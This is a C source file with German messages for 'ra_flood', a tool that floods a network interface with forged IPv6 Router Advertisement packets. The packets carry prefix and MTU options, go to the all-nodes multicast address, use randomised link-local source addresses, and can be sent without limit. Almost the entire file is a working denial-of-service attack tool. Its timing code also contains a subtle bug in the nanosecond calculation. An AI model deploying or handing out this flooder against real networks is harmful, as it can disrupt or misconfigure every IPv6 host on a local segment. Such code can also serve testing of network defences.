#define _POSIX_C_SOURCE 199309L

#include "ra_flood.h"
#include "ip6.h"
#include "icmp6.h"

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <errno.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <strings.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include <limits.h>

int main(int argc, char **args){
	unsigned int num = 0;
	unsigned int interval = 1000;
	char ifc[IFNAMSIZ] = "lo";
	for(int i=1; i<argc; i++){
		if(!strcmp(args[i], "-h")){
			print_help();
			return EXIT_SUCCESS;
		} else if(!strcmp(args[i], "-n")){
			if(i+1<argc){
				num = validate_uint(args[++i]);
			}
			else{
				fprintf(stderr, "Keine Anzahl gegeben.\n");
				return EXIT_FAILURE;
			}
		} else if (!strcmp(args[i], "-i")){
			if(i+1<argc){
				interval = validate_uint(args[++i]);
			}
			else{
				fprintf(stderr, "Kein Intervall gegeben.\n");
				return EXIT_FAILURE;
			}
		} else if(!strcmp(args[i], "-I")){
			if(i+1<argc)
				strncpy(ifc, args[++i], IFNAMSIZ);
			else{
				fprintf(stderr, "Kein Interface gegeben.\n");
				return EXIT_FAILURE;
			}
		} else{
			fprintf(stderr, "Argumente ungueltig.");
			return EXIT_FAILURE;
		}
	}
	ra_flood(num, interval, ifc);
	return EXIT_SUCCESS;
}

unsigned int validate_uint(char *str){
	errno = 0;
	char *ptr = NULL;
	long tmp = strtol(str, &ptr, 10);
	if(errno || ptr == str || (unsigned long)tmp>UINT_MAX || tmp<0){
		fprintf(stderr, "Argument ist keine Zahl, zu gross oder "
			"negativ.\n");
		exit(EXIT_FAILURE);
	}
	return (unsigned int)tmp;
}

void ra_flood(unsigned int num, unsigned int interval, char ifc[IFNAMSIZ]){
	struct timespec t = {interval/1000, (interval%1000)*10e9};
	int s = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ALL));
	struct sockaddr_ll sll = broadcast_socket(s, ifc);
	uint16_t addr[8] = {0xff02}; addr[7] = 0x1; //ziel
	uint8_t *ip = build_ip6pkt_min(56);
	if(!ip){
		fprintf(stderr, "Kein Speicher fuer das Paket da\n");
		exit(EXIT_FAILURE);
	}
	ip6_set_nxhd(ip, 58);
	ip6_set_hoplim(ip, 42);
	ip6_set_destadd(ip, addr);
	append_icmp6_ra(ip, 0);
	append_icmp6_prefinf(ip, 56);
	append_icmp6_mtu(ip, 88);
	srand(time(NULL));
	addr[0] = 0xfe80;
	ip6_set_srcadd(ip, addr);
	icmp6_calc_checksum(ip, 96);
	ssize_t bytes_sent;
	for(unsigned int i=0; i<num || num == 0; i++){
		//zufällige adresse
		for(int j=4; j<8; j++)
			addr[j] = rand();
		ip6_set_srcadd(ip, addr);
		icmp6_calc_checksum(ip, 96);
		bytes_sent = sendto(s, ip, 96, 0, (struct sockaddr*)&sll,
			sizeof(sll));
		if(bytes_sent != -1){
			printf(".");
			fflush(stdout);
		}
		else{
			perror("Fehler beim Senden\n");
			exit(EXIT_FAILURE);
		}
		nanosleep(&t, NULL);
	}
	printf("\n");
	free(ip);
}

/**
 * Bindet das raw socket s an Interface ifc mit Broadcastadresse.
 * Gibt die Adresse als struct sockaddr_sll zurück.
 */
struct sockaddr_ll broadcast_socket(int s, char ifc[IFNAMSIZ]){
	struct sockaddr_ll sll;
	struct ifreq ifr;
	bzero(&sll, sizeof(sll));
	bzero(&ifr, sizeof(ifr));
	strncpy((char*)ifr.ifr_name, ifc, IFNAMSIZ);
	if((ioctl(s, SIOCGIFINDEX, &ifr)) == -1){
		perror("Interface nicht gefunden\n");
		exit(EXIT_FAILURE);
	}
	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = ifr.ifr_ifindex;
	sll.sll_protocol = htons(ETH_P_IPV6);
	for(int i=0; i<6; i++)
		sll.sll_addr[i] = 0xff;
	if((bind(s, (struct sockaddr *)&sll, sizeof(sll)))== -1){
		perror("Konnte kein raw socket ans Interface binden\n");
		exit(EXIT_FAILURE);
	}
	return sll;
}

void print_help(){
	printf("ra_flood [-h] [-n num_packets] [-i interval]"
		"[-I interface]\n"
		"-h\tHilfe anzeigen\n"
		"-n NUM\tNUM Pakete senden (0: unbegrenzt), default 0\n"
		"-i IV\tIV Zeit (ms) zwischen einzelnen Paketen, default 1000\n"
		"-I IF\tauf Interface IF senden, default lo\n");
}
